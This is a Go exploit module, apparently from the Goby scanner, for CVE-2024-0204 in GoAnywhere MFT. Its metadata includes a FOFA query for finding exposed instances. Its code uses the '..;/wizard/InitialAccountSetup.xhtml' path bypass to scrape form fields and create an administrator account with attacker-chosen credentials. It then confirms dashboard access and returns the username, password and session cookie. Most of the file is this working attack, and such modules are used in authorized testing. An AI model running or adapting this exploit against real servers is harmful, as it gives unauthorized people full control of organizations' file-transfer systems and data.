package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "GoAnywhere MFT InitialAccountSetup.xhtml Bypass Vulnerability (CVE-2024-0204)",
    "Description": "<p>GoAnywhere MFT (Managed File Transfer) is an enterprise-class file transfer solution provided by HelpSystems, designed to meet the needs of organizations for secure, manageable and automated file transfer.</p><p>Authentication bypass vulnerability in GoAnywhere MFT before Fortra version 7.4.1. Allows unauthorized users to pretend to be administrators through the management portal, create arbitrary management users, and take over the entire system.</p>",
    "Product": "GoAnywhere-MFT",
    "Homepage": "https://www.goanywhere.com/",
    "DisclosureDate": "2024-01-22",
    "PostTime": "2024-01-24",
    "Author": "zou",
    "FofaQuery": "title=\"GoAnywhere\" || header=\"/goanywhere\" || banner=\"/goanywhere\"",
    "GobyQuery": "title=\"GoAnywhere\" || header=\"/goanywhere\" || banner=\"/goanywhere\"",
    "Level": "3",
    "Impact": "<p>Authentication bypass vulnerability in GoAnywhere MFT before Fortra version 7.4.1. Allows unauthorized users to pretend to be administrators through the management portal, create arbitrary management users, and take over the entire system.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://www.fortra.com/security/advisory/fi-2024-001\">https://www.fortra.com/security/advisory/fi-2024-001</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "register",
            "show": ""
        },
        {
            "name": "username",
            "type": "input",
            "value": "adminadmin",
            "show": "attackType=register"
        },
        {
            "name": "password",
            "type": "input",
            "value": "admxsxdmin",
            "show": "attackType=register"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2024-0204"
    ],
    "CNNVD": [
        "CNNVD-202401-1972"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "GoAnywhere MFT InitialAccountSetup.xhtml 绕过漏洞（CVE-2024-0204）",
            "Product": "GoAnywhere-MFT",
            "Description": "<p>GoAnywhere MFT（Managed File Transfer）是一款由 HelpSystems 公司提供的企业级文件传输解决方案，旨在满足组织对于安全、可管理和自动化文件传输的需求。</p><p>Fortra 7.4.1 版之前的 GoAnywhere MFT 中的身份验证绕过漏洞。允许未经授权的用户通过管理门户伪装成管理员,任意创建管理用户，从而接管整个系统。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.fortra.com/security/advisory/fi-2024-001\" target=\"_blank\">https://www.fortra.com/security/advisory/fi-2024-001</a><br></p>",
            "Impact": "<p>Fortra 7.4.1 版之前的 GoAnywhere MFT 中的身份验证绕过漏洞。允许未经授权的用户通过管理门户伪装成管理员,任意创建管理用户，从而接管整个系统。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "GoAnywhere MFT InitialAccountSetup.xhtml Bypass Vulnerability (CVE-2024-0204)",
            "Product": "GoAnywhere-MFT",
            "Description": "<p>GoAnywhere MFT (Managed File Transfer) is an enterprise-class file transfer solution provided by HelpSystems, designed to meet the needs of organizations for secure, manageable and automated file transfer.</p><p>Authentication bypass vulnerability in GoAnywhere MFT before Fortra version 7.4.1. Allows unauthorized users to pretend to be administrators through the management portal, create arbitrary management users, and take over the entire system.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://www.fortra.com/security/advisory/fi-2024-001\" target=\"_blank\">https://www.fortra.com/security/advisory/fi-2024-001</a><br></p>",
            "Impact": "<p>Authentication bypass vulnerability in GoAnywhere MFT before Fortra version 7.4.1. Allows unauthorized users to pretend to be administrators through the management portal, create arbitrary management users, and take over the entire system.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10911"
}`
	usernameRegexpFlagBXDmMnG := regexp.MustCompile(`name="(.+:creteAdminGrid:username)" type="text"`)
	passwordHinputRegexpFlagBXDmMnG := regexp.MustCompile(`name="(.+:creteAdminGrid:password_hinput)" type="hidden"`)
	passwordRegexpFlagBXDmMnG := regexp.MustCompile(`name="(.+:creteAdminGrid:password)" type="text"`)
	confirmPasswordHinputRegexpFlagBXDmMnG := regexp.MustCompile(`name="(.+:creteAdminGrid:confirmPassword_hinput)" type="hidden"`)
	confirmPasswordRegexpFlagBXDmMnG := regexp.MustCompile(`name="(.+:creteAdminGrid:confirmPassword)" type="text"`)
	submitButtonRegexpFlagBXDmMnG := regexp.MustCompile(`name="(.+:creteAdminGrid:submitButton)" class="ui-button`)
	errorMessageRegexpFlagBXDmMnG := regexp.MustCompile(`<span class="ui-messages-error-summary">([\w\W]+)<\/span>*?`)
	registeredAccount := func(hostInfo *httpclient.FixUrl, username string, password string) (*httpclient.HttpResponse, error) {
		getViewStateConfig := httpclient.NewGetRequestConfig("/goanywhere/images/..;/wizard/InitialAccountSetup.xhtml")
		getViewStateConfig.VerifyTls = false
		getViewStateConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, getViewStateConfig); resp != nil && strings.Contains(resp.Utf8Html, "name=\"javax.faces.ViewState\"") && len(regexp.MustCompile(`value="([^"]+)" autocomplete=`).FindStringSubmatch(resp.Utf8Html)) > 0 {
			registerConfig := httpclient.NewPostRequestConfig("/goanywhere/images/..;/wizard/InitialAccountSetup.xhtml")
			registerConfig.VerifyTls = false
			registerConfig.FollowRedirect = false
			registerConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			registerConfig.Header.Store(`Cookie`, resp.Cookie)
			usernameRegexpResult := usernameRegexpFlagBXDmMnG.FindStringSubmatch(resp.RawBody)
			passwordHinputRegexpResult := passwordHinputRegexpFlagBXDmMnG.FindStringSubmatch(resp.RawBody)
			passwordRegexpResult := passwordRegexpFlagBXDmMnG.FindStringSubmatch(resp.RawBody)
			confirmPasswordHinputRegexpResult := confirmPasswordHinputRegexpFlagBXDmMnG.FindStringSubmatch(resp.RawBody)
			confirmPasswordRegexpResult := confirmPasswordRegexpFlagBXDmMnG.FindStringSubmatch(resp.RawBody)
			submitButtonRegexpResult := submitButtonRegexpFlagBXDmMnG.FindStringSubmatch(resp.RawBody)
			if len(usernameRegexpResult) > 1 && len(passwordHinputRegexpResult) > 1 && len(passwordRegexpResult) > 1 && len(confirmPasswordHinputRegexpResult) > 1 && len(confirmPasswordRegexpResult) > 1 && len(submitButtonRegexpResult) > 1 {
				registerConfig.Data = fmt.Sprintf("%s=%s&%s=%s&%s=%s&%s=%s&%s=%s&%s=&createAdminForm_SUBMIT=1&javax.faces.ViewState=%s", url.QueryEscape(usernameRegexpResult[1]), url.QueryEscape(username), url.QueryEscape(passwordHinputRegexpResult[1]), url.QueryEscape(password), url.QueryEscape(passwordRegexpResult[1]), "%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2", url.QueryEscape(confirmPasswordHinputRegexpResult[1]), url.QueryEscape(password), url.QueryEscape(confirmPasswordRegexpResult[1]), "%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2%E2%80%A2", url.QueryEscape(submitButtonRegexpResult[1]), url.QueryEscape(regexp.MustCompile(`value="([^"]+)" autocomplete=`).FindStringSubmatch(resp.Utf8Html)[1]))
				return httpclient.DoHttpRequest(hostInfo, registerConfig)
			}
			return nil, errors.New("漏洞利用失败")
		} else if err != nil {
			return nil, err
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			username := goutils.RandomHexString(16)
			resp, _ := registeredAccount(hostInfo, username, "aaxx")
			return resp != nil && len(errorMessageRegexpFlagBXDmMnG.FindStringSubmatch(resp.RawBody)) > 1 && len(errorMessageRegexpFlagBXDmMnG.FindStringSubmatch(resp.RawBody)[1]) > 0
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "register" {
				username := goutils.B2S(ss.Params["username"])
				password := goutils.B2S(ss.Params["password"])
				if resp, err := registeredAccount(expResult.HostInfo, username, password); resp != nil && resp.StatusCode == 302 && resp.Header != nil && resp.Header.Get(`Location`) == `/goanywhere/Dashboard.xhtml` {
					checkRegisterRequestConfig := httpclient.NewGetRequestConfig(`/goanywhere/images/..;/Dashboard.xhtml`)
					checkRegisterRequestConfig.VerifyTls = false
					checkRegisterRequestConfig.FollowRedirect = false
					cookie := resp.Cookie
					checkRegisterRequestConfig.Header.Store(`Cookie`, cookie)
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, checkRegisterRequestConfig); resp != nil && strings.Contains(resp.RawBody, `/goanywhere/jobs/CompletedJobs.xhtml`) && strings.Contains(resp.RawBody, `/goanywhere/jobs/ActiveJobs.xhtml`) {
						expResult.Success = true
						expResult.Output = fmt.Sprintf("Username: %s\nPassword: %s\nCookie: %s", username, password, cookie)
					} else if err != nil {
						expResult.Output = err.Error()
					}
				} else if resp != nil && len(errorMessageRegexpFlagBXDmMnG.FindStringSubmatch(resp.RawBody)) > 1 && len(errorMessageRegexpFlagBXDmMnG.FindStringSubmatch(resp.RawBody)[1]) > 0 {
					expResult.Output = errorMessageRegexpFlagBXDmMnG.FindStringSubmatch(resp.RawBody)[1]
					expResult.Success = false
				} else if err != nil {
					expResult.Output = err.Error()
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
